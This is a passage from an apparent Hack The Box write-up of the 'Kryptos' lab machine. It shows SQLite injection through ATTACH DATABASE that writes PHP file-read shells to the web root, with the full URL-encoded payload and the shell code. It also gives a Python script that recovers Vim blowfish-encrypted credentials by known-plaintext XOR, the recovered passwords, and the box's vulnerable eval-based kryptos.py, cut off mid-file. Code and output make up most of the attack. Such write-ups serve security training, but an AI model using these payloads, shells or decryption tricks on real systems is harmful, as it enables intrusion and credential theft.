<span class="p">[</span><span class="o">?</span><span class="p">]</span> <span class="no">URL</span> <span class="o">:</span> <span class="n">http</span><span class="o">://</span><span class="mf">127.0.0.1</span><span class="o">/</span><span class="n">dev</span><span class="o">/</span><span class="n">d9e28afcf0b274a5e0542abb67db0784</span><span class="o">/</span><span class="n">rick</span><span class="mf">.</span><span class="n">php</span><span class="o">?</span><span class="n">dir</span><span class="o">=/</span><span class="n">home</span><span class="o">/</span><span class="n">rijndael</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="nc">Result</span> <span class="o">:</span>
<span class="nc">V3ArraypwnpwnCREATE</span> <span class="no">TABLE</span> <span class="nf">pwn</span> <span class="p">(</span><span class="n">dataz</span> <span class="n">text</span><span class="p">)</span>
<span class="p">(</span>
    <span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=&gt;</span> <span class="mf">.</span>
    <span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">=&gt;</span> <span class="mf">..</span>
    <span class="p">[</span><span class="mi">2</span><span class="p">]</span> <span class="o">=&gt;</span> <span class="mf">.</span><span class="n">bash_history</span>
    <span class="p">[</span><span class="mi">3</span><span class="p">]</span> <span class="o">=&gt;</span> <span class="mf">.</span><span class="n">bash_logout</span>
    <span class="p">[</span><span class="mi">4</span><span class="p">]</span> <span class="o">=&gt;</span> <span class="mf">.</span><span class="n">bashrc</span>
    <span class="p">[</span><span class="mi">5</span><span class="p">]</span> <span class="o">=&gt;</span> <span class="mf">.</span><span class="n">cache</span>
    <span class="p">[</span><span class="mi">6</span><span class="p">]</span> <span class="o">=&gt;</span> <span class="mf">.</span><span class="n">gnupg</span>
    <span class="p">[</span><span class="mi">7</span><span class="p">]</span> <span class="o">=&gt;</span> <span class="mf">.</span><span class="n">profile</span>
    <span class="p">[</span><span class="mi">8</span><span class="p">]</span> <span class="o">=&gt;</span> <span class="mf">.</span><span class="n">ssh</span>
    <span class="p">[</span><span class="mi">9</span><span class="p">]</span> <span class="o">=&gt;</span> <span class="n">creds</span><span class="mf">.</span><span class="n">old</span>
    <span class="p">[</span><span class="mi">10</span><span class="p">]</span> <span class="o">=&gt;</span> <span class="n">creds</span><span class="mf">.</span><span class="n">txt</span>
    <span class="p">[</span><span class="mi">11</span><span class="p">]</span> <span class="o">=&gt;</span> <span class="n">kryptos</span>
    <span class="p">[</span><span class="mi">12</span><span class="p">]</span> <span class="o">=&gt;</span> <span class="n">user</span><span class="mf">.</span><span class="n">txt</span>
<span class="p">)</span>
</code></pre></div></div>
<p>I couldn’t read <code class="language-plaintext highlighter-rouge">user.txt</code> or go to the ssh directory, but I could read <code class="language-plaintext highlighter-rouge">creds.txt</code> and <code class="language-plaintext highlighter-rouge">creds.old</code> :</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>[?] URL : http://127.0.0.1/dev/d9e28afcf0b274a5e0542abb67db0784/rick.php?file=/home/rijndael/creds.old
[*] Result :
V3rijndael / Password1BLE pwn (dataz text)
[?] URL : http://127.0.0.1/dev/d9e28afcf0b274a5e0542abb67db0784/rick.php?file=/home/rijndael/creds.txt
[*] Result :
V3VimCrypt~02!REATE TABLE pwn (dataz text)
vnd]KyYC}56gMRAn[?] URL : 
</code></pre></div></div>
<p>I copied both of these files from my directory (<code class="language-plaintext highlighter-rouge">ssrf</code>) :</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/Desktop/HTB/boxes/kryptos# cp ssrf/OUTPUT_19 ./creds.old
root@kali:~/Desktop/HTB/boxes/kryptos# cp ssrf/OUTPUT_20 ./creds.txt
root@kali:~/Desktop/HTB/boxes/kryptos# cat creds.old
V3rijndael / Password1BLE pwn (dataz text)
root@kali:~/Desktop/HTB/boxes/kryptos# cat creds.txt
V3VimCrypt~02!REATE TABLE pwn (dataz text)
vnd]KyYC}56gMRAn
</code></pre></div></div>
<p>But because of that weird characters thing the files were partially damaged, so I wrote another php <code class="language-plaintext highlighter-rouge">file</code> to print the base-64 encoded value of the file between a bunch of newlines :</p>
<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?php</span> <span class="k">echo</span> <span class="s2">"</span><span class="se">\n\n\n\n\n</span><span class="s2">"</span><span class="p">;</span> <span class="k">echo</span> <span class="nb">base64_encode</span><span class="p">(</span><span class="nb">file_get_contents</span><span class="p">(</span><span class="s2">"</span><span class="nv">$_GET[file]</span><span class="s2">"</span><span class="p">));</span> <span class="k">echo</span> <span class="s2">"</span><span class="se">\n\n\n\n\n</span><span class="s2">"</span> <span class="cp">?&gt;</span>
</code></pre></div></div>

<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code>[?] URL : http://127.0.0.1/dev/sqlite_test_page.php?no_results=FALSE<span class="err">&amp;</span>bookid=%31%3b%41%54%54%41%43%48%20%44%41%54%41%42%41%53%45%20%27%64%39%65%32%38%61%66%63%66%30%62%32%37%34%61%35%65%30%35%34%32%61%62%62%36%37%64%62%30%37%38%34%2f%72%69%63%6b%32%2e%70%68%70%27%20%41%53%20%72%69%63%6b%3b%43%52%45%41%54%45%20%54%41%42%4c%45%20%72%69%63%6b%2e%70%77%6e%20%28%64%61%74%61%7a%20%74%65%78%74%29%3b%49%4e%53%45%52%54%20%49%4e%54%4f%20%72%69%63%6b%2e%70%77%6e%20%28%64%61%74%61%7a%29%20%56%41%4c%55%45%53%20%28%27%3c%3f%70%68%70%20%65%63%68%6f%20%22%5c%6e%5c%6e%5c%6e%5c%6e%5c%6e%22%3b%20%65%63%68%6f%20%62%61%73%65%36%34%5f%65%6e%63%6f%64%65%28%66%69%6c%65%5f%67%65%74%5f%63%6f%6e%74%65%6e%74%73%28%22%24%5f%47%45%54%5b%66%69%6c%65%5d%22%29%29%3b%20%65%63%68%6f%20%22%5c%6e%5c%6e%5c%6e%5c%6e%5c%6e%22%20%3f%3e%27%29%3b                             
[*] Result :
<span class="nt">&lt;html&gt;</span>
<span class="nt">&lt;head&gt;&lt;/head&gt;</span>
<span class="nt">&lt;body&gt;</span>
Opened database successfully
Query : SELECT * FROM books WHERE id=1;ATTACH DATABASE 'd9e28afcf0b274a5e0542abb67db0784/rick2.php' AS rick;CREATE TABLE rick.pwn (dataz text);INSERT INTO rick.pwn (dataz) VALUES ('<span class="cp">&lt;?php echo "\n\n\n\n\n"; echo base64_encode(file_get_contents("$_GET[file]")); echo "\n\n\n\n\n" ?&gt;</span>');
<span class="nt">&lt;/body&gt;</span>
<span class="nt">&lt;/html&gt;</span>
</code></pre></div></div>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>[?] URL : http://127.0.0.1/dev/d9e28afcf0b274a5e0542abb67db0784/rick2.php?file=/home/rijndael/creds.txt
[*] Result :
fStablepwnpwnCREATE TABLE pwn (dataz text)




VmltQ3J5cHR+MDIhCxjkNctWEpo1RIBAcDuWLZMNqBB2bmRdwUviHHlZQ33ZNfs2Z01SQYtu




[?] URL : 

</code></pre></div></div>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/Desktop/HTB/boxes/kryptos# echo VmltQ3J5cHR+MDIhCxjkNctWEpo1RIBAcDuWLZMNqBB2bmRdwUviHHlZQ33ZNfs2Z01SQYtu | base64 -d &gt; creds.txt 
root@kali:~/Desktop/HTB/boxes/kryptos# cat creds.txt 
VimCrypt~02!
vnd]KyYC}56gMRAnroot@kali:~/Desktop/HTB/boxes/kryptos# file creds.txt 
creds.txt: Vim encrypted file data
root@kali:~/Desktop/HTB/boxes/kryptos# 
</code></pre></div></div>

<h2 id="decrypting-the-credentials-user-flag">Decrypting the Credentials, User Flag</h2>
<p>The old credentials : <code class="language-plaintext highlighter-rouge">rijndael / Password1</code> didn’t work with ssh.<br>
And the new credentials are encrypted :</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>kali:~/Desktop/HTB/boxes/kryptos# file creds.txt 
creds.txt: Vim encrypted file data
</code></pre></div></div>
<p>I searched about how <code class="language-plaintext highlighter-rouge">vim</code> encrypts files and if there were any known vulnerabilities. I found this <a href="https://dgl.cx/2014/10/vim-blowfish" target="_blank" rel="noopener noreferrer">article</a> which was talking about a weakness in this encryption system.<br>
I won’t repeat what was said in the article but these are the important parts :</p>

<blockquote>
  <p>The Vim editor has two modes of encryption. The old pkzip based system (which is broken, but still the default for compatiblity reasons) and the new (as of Vim 7.3) blowfish based system.<br></p>
</blockquote>

<blockquote>
  <p>Blowfish is a block cipher, this means it encrypts a block of data at a time. There is no state kept between blocks, this is important to understand; it means the same input will result in the same output (if the key is the same).</p>
</blockquote>

<blockquote>
  <p>the issue is that Vim actually ends up using the same IV for the first 8 blocks (essentially repeating the first part of the diagram 8 times, then going on to the next operation that mixes in the output). So the result is something like CFB but with the first 64 bytes lacking any protection.</p>
</blockquote>

<blockquote>
  <p>The way CFB works is to compute a stream of data (the keystream), then XOR it with the plaintext. However Vim is reusing the keystream, in pseudocode:</p>

  <pre><code class="language-pseudocode">keystream = Blowfish(iv)
ciphertext1 = XOR(keystream, plaintext[0:7])
ciphertext2 = XOR(keystream, plaintext[8:15])
</code></pre>

  <p>This means by a simple relationship we can recover the keystream:</p>

  <pre><code class="language-pseudocode">keystream = XOR(ciphertext1, plaintext[0:7])
</code></pre>
</blockquote>

<p>With this information I started testing some stuff. We have <code class="language-plaintext highlighter-rouge">creds.old</code> :</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>rijndael / Password1
</code></pre></div></div>
<p>As you can see <code class="language-plaintext highlighter-rouge">rijndael</code> which is the username might be also present in the encrypted file as the first 8 bytes. So I tried using <code class="language-plaintext highlighter-rouge">rijndael</code> as the known plaintext.<br>
In python I opened the file for reading :</p>
<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">&gt;&gt;&gt;</span> <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s">"./creds.txt"</span><span class="p">,</span><span class="s">"rb"</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
</code></pre></div></div>
<p>We don’t need the first 28 bytes : 12 bytes for the header (<code class="language-plaintext highlighter-rouge">VimCrypt~02!</code>) + 8 bytes for the salt + 8 bytes for the <code class="language-plaintext highlighter-rouge">IV</code>. So I stored them in a variable that I won’t use :</p>
<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">...</span>     <span class="n">temp</span> <span class="o">=</span> <span class="n">f</span><span class="p">.</span><span class="n">read</span><span class="p">(</span><span class="mi">28</span><span class="p">)</span>
</code></pre></div></div>
<p>Then we have about 4 blocks left (each block 8 bytes) :</p>
<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">root</span><span class="err">@</span><span class="n">kali</span><span class="o">:~/</span><span class="n">Desktop</span><span class="o">/</span><span class="n">HTB</span><span class="o">/</span><span class="n">boxes</span><span class="o">/</span><span class="n">kryptos</span><span class="err">#</span> <span class="n">xxd</span> <span class="n">creds</span><span class="p">.</span><span class="n">txt</span>
<span class="mo">00000000</span><span class="o">:</span> <span class="mi">5669</span> <span class="mi">6</span><span class="n">d43</span> <span class="mi">7279</span> <span class="mi">7074</span> <span class="mf">7e30</span> <span class="mi">3221</span> <span class="mi">0</span><span class="n">b18</span> <span class="n">e435</span>  <span class="n">VimCrypt</span><span class="o">~</span><span class="mo">02</span><span class="o">!</span><span class="p">...</span><span class="mi">5</span>
<span class="mo">00000010</span><span class="o">:</span> <span class="n">cb56</span> <span class="mi">129</span><span class="n">a</span> <span class="mi">3544</span> <span class="mi">8040</span> <span class="mi">703</span><span class="n">b</span> <span class="mi">962</span><span class="n">d</span> <span class="mi">930</span><span class="n">d</span> <span class="n">a810</span>  <span class="p">.</span><span class="n">V</span><span class="p">..</span><span class="mi">5</span><span class="n">D</span><span class="p">.</span><span class="err">@</span><span class="n">p</span><span class="p">;.</span><span class="o">-</span><span class="p">....</span>
<span class="mo">00000020</span><span class="o">:</span> <span class="mi">766</span><span class="n">e</span> <span class="mi">645</span><span class="n">d</span> <span class="n">c14b</span> <span class="n">e21c</span> <span class="mi">7959</span> <span class="mi">437</span><span class="n">d</span> <span class="n">d935</span> <span class="n">fb36</span>  <span class="n">vnd</span><span class="p">].</span><span class="n">K</span><span class="p">..</span><span class="n">yYC</span><span class="err">}</span><span class="p">.</span><span class="mi">5</span><span class="p">.</span><span class="mi">6</span>
<span class="mo">00000030</span><span class="o">:</span> <span class="mi">674</span><span class="n">d</span> <span class="mi">5241</span> <span class="mi">8</span><span class="n">b6e</span>                           <span class="n">gMRA</span><span class="p">.</span><span class="n">n</span>
</code></pre></div></div>
<p>So I read them :</p>
<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">...</span>     <span class="n">block1</span> <span class="o">=</span> <span class="n">f</span><span class="p">.</span><span class="n">read</span><span class="p">(</span><span class="mi">8</span><span class="p">)</span>
<span class="p">...</span>     <span class="n">block2</span> <span class="o">=</span> <span class="n">f</span><span class="p">.</span><span class="n">read</span><span class="p">(</span><span class="mi">8</span><span class="p">)</span>
<span class="p">...</span>     <span class="n">block3</span> <span class="o">=</span> <span class="n">f</span><span class="p">.</span><span class="n">read</span><span class="p">(</span><span class="mi">8</span><span class="p">)</span>
<span class="p">...</span>     <span class="n">block4</span> <span class="o">=</span> <span class="n">f</span><span class="p">.</span><span class="n">read</span><span class="p">(</span><span class="mi">8</span><span class="p">)</span>
<span class="p">...</span>     <span class="n">f</span><span class="p">.</span><span class="n">close</span><span class="p">()</span>
</code></pre></div></div>
<p>I used the same relation from the article to get the key :</p>
<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">keystream</span> <span class="o">=</span> <span class="n">XOR</span><span class="p">(</span><span class="n">ciphertext1</span><span class="p">,</span> <span class="n">plaintext</span><span class="p">[</span><span class="mi">0</span><span class="p">:</span><span class="mi">7</span><span class="p">])</span>
</code></pre></div></div>
<p>I <code class="language-plaintext highlighter-rouge">XOR</code>ed the plaintext (<code class="language-plaintext highlighter-rouge">rijndael</code>) with the first block :</p>
<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">&gt;&gt;&gt;</span> <span class="n">key</span> <span class="o">=</span> <span class="s">''</span><span class="p">.</span><span class="n">join</span><span class="p">(</span><span class="nb">chr</span><span class="p">(</span><span class="nb">ord</span><span class="p">(</span><span class="n">a</span><span class="p">)</span><span class="o">^</span><span class="nb">ord</span><span class="p">(</span><span class="n">b</span><span class="p">))</span> <span class="k">for</span> <span class="n">a</span><span class="p">,</span> <span class="n">b</span> <span class="ow">in</span> <span class="nb">zip</span><span class="p">(</span><span class="n">block1</span><span class="p">,</span> <span class="s">'rijndael'</span><span class="p">))</span> 
</code></pre></div></div>
<p>Then I tried to decode the first 2 blocks with the retrieved key and it worked successfully :</p>
<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">&gt;&gt;&gt;</span> <span class="k">print</span> <span class="s">''</span><span class="p">.</span><span class="n">join</span><span class="p">(</span><span class="nb">chr</span><span class="p">(</span><span class="nb">ord</span><span class="p">(</span><span class="n">a</span><span class="p">)</span><span class="o">^</span><span class="nb">ord</span><span class="p">(</span><span class="n">b</span><span class="p">))</span> <span class="k">for</span> <span class="n">a</span><span class="p">,</span> <span class="n">b</span> <span class="ow">in</span> <span class="nb">zip</span><span class="p">(</span><span class="n">block1</span><span class="p">,</span> <span class="n">key</span><span class="p">))</span>
<span class="n">rijndael</span>
<span class="o">&gt;&gt;&gt;</span> <span class="k">print</span> <span class="s">''</span><span class="p">.</span><span class="n">join</span><span class="p">(</span><span class="nb">chr</span><span class="p">(</span><span class="nb">ord</span><span class="p">(</span><span class="n">a</span><span class="p">)</span><span class="o">^</span><span class="nb">ord</span><span class="p">(</span><span class="n">b</span><span class="p">))</span> <span class="k">for</span> <span class="n">a</span><span class="p">,</span> <span class="n">b</span> <span class="ow">in</span> <span class="nb">zip</span><span class="p">(</span><span class="n">block2</span><span class="p">,</span> <span class="n">key</span><span class="p">))</span>
<span class="o">/</span> <span class="n">bkVBL</span>
<span class="o">&gt;&gt;&gt;</span>
</code></pre></div></div>
<p>After my testing was successful I wrote this script which does it automatically :
<code class="language-plaintext highlighter-rouge">vim-decrypt.py</code> :</p>
<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#!/usr/bin/python
</span><span class="kn">import</span> <span class="nn">sys</span>

<span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">)</span> <span class="o">!=</span> <span class="mi">3</span><span class="p">:</span>
	<span class="k">print</span> <span class="s">"[-] Usage: {} &lt;encrypted file&gt; &lt;plaintext&gt; "</span><span class="p">.</span><span class="nb">format</span><span class="p">(</span><span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">0</span><span class="p">])</span>
	<span class="nb">exit</span><span class="p">()</span>

<span class="nb">file</span> <span class="o">=</span> <span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span>
<span class="n">plaintext</span> <span class="o">=</span> <span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span>

<span class="k">def</span> <span class="nf">xor</span><span class="p">(</span><span class="n">string</span><span class="p">,</span><span class="n">key</span><span class="p">):</span>
	<span class="k">return</span> <span class="s">''</span><span class="p">.</span><span class="n">join</span><span class="p">(</span><span class="nb">chr</span><span class="p">(</span><span class="nb">ord</span><span class="p">(</span><span class="n">a</span><span class="p">)</span><span class="o">^</span><span class="nb">ord</span><span class="p">(</span><span class="n">b</span><span class="p">))</span> <span class="k">for</span> <span class="n">a</span><span class="p">,</span> <span class="n">b</span> <span class="ow">in</span> <span class="nb">zip</span><span class="p">(</span><span class="n">string</span><span class="p">,</span> <span class="n">key</span><span class="p">))</span>

<span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="nb">file</span><span class="p">,</span><span class="s">"rb"</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
	
	<span class="n">temp</span> <span class="o">=</span> <span class="n">f</span><span class="p">.</span><span class="n">read</span><span class="p">(</span><span class="mi">28</span><span class="p">)</span>

	<span class="n">block1</span> <span class="o">=</span> <span class="n">f</span><span class="p">.</span><span class="n">read</span><span class="p">(</span><span class="mi">8</span><span class="p">)</span>
	<span class="n">block2</span> <span class="o">=</span> <span class="n">f</span><span class="p">.</span><span class="n">read</span><span class="p">(</span><span class="mi">8</span><span class="p">)</span>
	<span class="n">block3</span> <span class="o">=</span> <span class="n">f</span><span class="p">.</span><span class="n">read</span><span class="p">(</span><span class="mi">8</span><span class="p">)</span>
	<span class="n">block4</span> <span class="o">=</span> <span class="n">f</span><span class="p">.</span><span class="n">read</span><span class="p">(</span><span class="mi">8</span><span class="p">)</span>
	
	<span class="n">f</span><span class="p">.</span><span class="n">close</span><span class="p">()</span>

<span class="n">key</span> <span class="o">=</span> <span class="n">xor</span><span class="p">(</span><span class="n">block1</span><span class="p">,</span> <span class="n">plaintext</span><span class="p">)</span>

<span class="n">final</span> <span class="o">=</span> <span class="s">""</span>
<span class="n">final</span> <span class="o">+=</span> <span class="n">xor</span><span class="p">(</span><span class="n">block1</span><span class="p">,</span> <span class="n">key</span><span class="p">)</span>
<span class="n">final</span> <span class="o">+=</span> <span class="n">xor</span><span class="p">(</span><span class="n">block2</span><span class="p">,</span> <span class="n">key</span><span class="p">)</span>
<span class="n">final</span> <span class="o">+=</span> <span class="n">xor</span><span class="p">(</span><span class="n">block3</span><span class="p">,</span> <span class="n">key</span><span class="p">)</span>
<span class="n">final</span> <span class="o">+=</span> <span class="n">xor</span><span class="p">(</span><span class="n">block4</span><span class="p">,</span> <span class="n">key</span><span class="p">)</span>

<span class="k">print</span> <span class="s">"[+] Decrypted: </span><span class="se">\n</span><span class="s">"</span>
<span class="k">print</span> <span class="n">final</span>
</code></pre></div></div>
<p>I got the credentials :</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/Desktop/HTB/boxes/kryptos# ./vim-decrypt.py ./creds.txt rijndael
[+] Decrypted: 

rijndael / bkVBL8Q9HuBSpj

root@kali:~/Desktop/HTB/boxes/kryptos# 
</code></pre></div></div>
<p>Then I could ssh into the box as <code class="language-plaintext highlighter-rouge">rijndael</code> :
<br><img src="/images/hackthebox/kryptos/18.png" alt="" class="align-center"><br><br>
We owned user.<br></p>

<h2 id="kryptospy-analysis">kryptos.py: Analysis</h2>
<p>In the home directory of <code class="language-plaintext highlighter-rouge">rijndael</code> there was a directory called <code class="language-plaintext highlighter-rouge">kryptos</code> which had a python script called <code class="language-plaintext highlighter-rouge">kryptos.py</code> :</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>rijndael@kryptos:~$ ls -la
total 48
drwxr-xr-x 6 rijndael rijndael 4096 Mar 13  2019 .
drwxr-xr-x 3 root     root     4096 Oct 30  2018 ..
lrwxrwxrwx 1 root     root        9 Oct 31  2018 .bash_history -&gt; /dev/null
-rw-r--r-- 1 root     root      220 Oct 30  2018 .bash_logout
-rw-r--r-- 1 root     root     3771 Oct 30  2018 .bashrc
drwx------ 2 rijndael rijndael 4096 Mar 13  2019 .cache
-rw-rw-r-- 1 root     root       21 Oct 30  2018 creds.old
-rw-rw-r-- 1 root     root       54 Oct 30  2018 creds.txt
drwx------ 3 rijndael rijndael 4096 Mar 13  2019 .gnupg
drwx------ 2 rijndael rijndael 4096 Mar 13  2019 kryptos
-rw-r--r-- 1 root     root      807 Oct 30  2018 .profile
drwx------ 2 rijndael rijndael 4096 Oct 31  2018 .ssh
-r-------- 1 rijndael rijndael   33 Oct 30  2018 user.txt
rijndael@kryptos:~$ cd kryptos/
rijndael@kryptos:~/kryptos$ ls -la
total 12
drwx------ 2 rijndael rijndael 4096 Mar 13  2019 .
drwxr-xr-x 6 rijndael rijndael 4096 Mar 13  2019 ..
-r-------- 1 rijndael rijndael 2257 Mar 13  2019 kryptos.py
rijndael@kryptos:~/kryptos$ 
</code></pre></div></div>
<p>I downloaded the script on my machine :</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/Desktop/HTB/boxes/kryptos# scp rijndael@kryptos.htb:/home/rijndael/kryptos/kryptos.py ./
rijndael@kryptos.htb's password: 
kryptos.py                                                                                                                                                                       100% 2257     6.8KB/s   00:00    
root@kali:~/Desktop/HTB/boxes/kryptos# 
</code></pre></div></div>
<p><code class="language-plaintext highlighter-rouge">kryptos.py</code> :</p>
<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">import</span> <span class="nn">random</span> 
<span class="kn">import</span> <span class="nn">json</span>
<span class="kn">import</span> <span class="nn">hashlib</span>
<span class="kn">import</span> <span class="nn">binascii</span>
<span class="kn">from</span> <span class="nn">ecdsa</span> <span class="kn">import</span> <span class="n">VerifyingKey</span><span class="p">,</span> <span class="n">SigningKey</span><span class="p">,</span> <span class="n">NIST384p</span>
<span class="kn">from</span> <span class="nn">bottle</span> <span class="kn">import</span> <span class="n">route</span><span class="p">,</span> <span class="n">run</span><span class="p">,</span> <span class="n">request</span><span class="p">,</span> <span class="n">debug</span>
<span class="kn">from</span> <span class="nn">bottle</span> <span class="kn">import</span> <span class="n">hook</span>
<span class="kn">from</span> <span class="nn">bottle</span> <span class="kn">import</span> <span class="n">response</span> <span class="k">as</span> <span class="n">resp</span>


<span class="k">def</span> <span class="nf">secure_rng</span><span class="p">(</span><span class="n">seed</span><span class="p">):</span> 
    <span class="c1"># Taken from the internet - probably secure
</span>    <span class="n">p</span> <span class="o">=</span> <span class="mi">2147483647</span>
    <span class="n">g</span> <span class="o">=</span> <span class="mi">2255412</span>

    <span class="n">keyLength</span> <span class="o">=</span> <span class="mi">32</span>
    <span class="n">ret</span> <span class="o">=</span> <span class="mi">0</span>
    <span class="n">ths</span> <span class="o">=</span> <span class="nb">round</span><span class="p">((</span><span class="n">p</span><span class="o">-</span><span class="mi">1</span><span class="p">)</span><span class="o">/</span><span class="mi">2</span><span class="p">)</span>
    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="n">keyLength</span><span class="o">*</span><span class="mi">8</span><span class="p">):</span>
        <span class="n">seed</span> <span class="o">=</span> <span class="nb">pow</span><span class="p">(</span><span class="n">g</span><span class="p">,</span><span class="n">seed</span><span class="p">,</span><span class="n">p</span><span class="p">)</span>
        <span class="k">if</span> <span class="n">seed</span> <span class="o">&gt;</span> <span class="n">ths</span><span class="p">:</span>
            <span class="n">ret</span> <span class="o">+=</span> <span class="mi">2</span><span class="o">**</span><span class="n">i</span>
    <span class="k">return</span> <span class="n">ret</span>

<span class="c1"># Set up the keys
</span><span class="n">seed</span> <span class="o">=</span> <span class="n">random</span><span class="p">.</span><span class="n">getrandbits</span><span class="p">(</span><span class="mi">128</span><span class="p">)</span>
<span class="n">rand</span> <span class="o">=</span> <span class="n">secure_rng</span><span class="p">(</span><span class="n">seed</span><span class="p">)</span> <span class="o">+</span> <span class="mi">1</span>
<span class="n">sk</span> <span class="o">=</span> <span class="n">SigningKey</span><span class="p">.</span><span class="n">from_secret_exponent</span><span class="p">(</span><span class="n">rand</span><span class="p">,</span> <span class="n">curve</span><span class="o">=</span><span class="n">NIST384p</span><span class="p">)</span>
<span class="n">vk</span> <span class="o">=</span> <span class="n">sk</span><span class="p">.</span><span class="n">get_verifying_key</span><span class="p">()</span>

<span class="k">def</span> <span class="nf">verify</span><span class="p">(</span><span class="n">msg</span><span class="p">,</span> <span class="n">sig</span><span class="p">):</span>
    <span class="k">try</span><span class="p">:</span>
        <span class="k">return</span> <span class="n">vk</span><span class="p">.</span><span class="n">verify</span><span class="p">(</span><span class="n">binascii</span><span class="p">.</span><span class="n">unhexlify</span><span class="p">(</span><span class="n">sig</span><span class="p">),</span> <span class="n">msg</span><span class="p">)</span>
    <span class="k">except</span><span class="p">:</span>
        <span class="k">return</span> <span class="bp">False</span>

<span class="k">def</span> <span class="nf">sign</span><span class="p">(</span><span class="n">msg</span><span class="p">):</span>
    <span class="k">return</span> <span class="n">binascii</span><span class="p">.</span><span class="n">hexlify</span><span class="p">(</span><span class="n">sk</span><span class="p">.</span><span class="n">sign</span><span class="p">(</span><span class="n">msg</span><span class="p">))</span>

<span class="o">@</span><span class="n">route</span><span class="p">(</span><span class="s">'/'</span><span class="p">,</span> <span class="n">method</span><span class="o">=</span><span class="s">'GET'</span><span class="p">)</span>
<span class="k">def</span> <span class="nf">web_root</span><span class="p">():</span>
    <span class="n">response</span> <span class="o">=</span> <span class="p">{</span><span class="s">'response'</span><span class="p">:</span>
                <span class="p">{</span>
                    <span class="s">'Application'</span><span class="p">:</span> <span class="s">'Kryptos Test Web Server'</span><span class="p">,</span>
                    <span class="s">'Status'</span><span class="p">:</span> <span class="s">'running'</span>
                <span class="p">}</span>
                <span class="p">}</span>
    <span class="k">return</span> <span class="n">json</span><span class="p">.</span><span class="n">dumps</span><span class="p">(</span><span class="n">response</span><span class="p">,</span> <span class="n">sort_keys</span><span class="o">=</span><span class="bp">True</span><span class="p">,</span> <span class="n">indent</span><span class="o">=</span><span class="mi">2</span><span class="p">)</span>

<span class="o">@</span><span class="n">route</span><span class="p">(</span><span class="s">'/eval'</span><span class="p">,</span> <span class="n">method</span><span class="o">=</span><span class="s">'POST'</span><span class="p">)</span>
<span class="k">def</span> <span class="nf">evaluate</span><span class="p">():</span>
    <span class="k">try</span><span class="p">:</span> 
        <span class="n">req_data</span> <span class="o">=</span> <span class="n">request</span><span class="p">.</span><span class="n">json</span>
        <span class="n">expr</span> <span class="o">=</span> <span class="n">req_data</span><span class="p">[</span><span class="s">'expr'</span><span class="p">]</span>
        <span class="n">sig</span> <span class="o">=</span> <span class="n">req_data</span><span class="p">[</span><span class="s">'sig'</span><span class="p">]</span>
        <span class="c1"># Only signed expressions will be evaluated
</span>        <span class="k">if</span> <span class="ow">not</span> <span class="n">verify</span><span class="p">(</span><span class="nb">str</span><span class="p">.</span><span class="n">encode</span><span class="p">(</span><span class="n">expr</span><span class="p">),</span> <span class="nb">str</span><span class="p">.</span><span class="n">encode</span><span class="p">(</span><span class="n">sig</span><span class="p">)):</span>
            <span class="k">return</span> <span class="s">"Bad signature"</span>
        <span class="n">result</span> <span class="o">=</span> <span class="nb">eval</span><span class="p">(</span><span class="n">expr</span><span class="p">,</span> <span class="p">{</span><span class="s">'__builtins__'</span><span class="p">:</span><span class="bp">None</span><span class="p">})</span> <span class="c1"># Builtins are removed, this should be pretty safe
</span>        <span class="n">response</span> <span class="o">=</span> <span class="p">{</span><span class="s">'response'</span><span class="p">:</span>
                    <span class="p">{</span>
                        <span class="s">'Expression'</span><span class="p">:</span> <span class="n">expr</span><span class="p">,</span>
                        <span class="s">'Result'</span><span class="p">:</span> <span class="nb">str</span><span class="p">(</span><span class="n">result</span><span class="p">)</span> 
                    <span class="p">}</span>
                    <span class="p">}</span>
        <span class="k">return</span> <span class="n">json</span><span class="p">.</span><span class="n">dumps</span><span class="p">(</span><span class="n">response</span><span class="p">,</span> <span class="n">sort_keys</span><span class="o">=</span><span class="bp">True</span><span class="p">,</span> <span class="n">indent</span><span class="o">=</span><span class="mi">2</span><span class="p">)</span>
    <span class="k">except</span><span class="p">:</span>
        <span class="k">return</span> <span class="s">"Error"</span>

<span class="c1"># Generate a sample expression and signature for debugging purposes
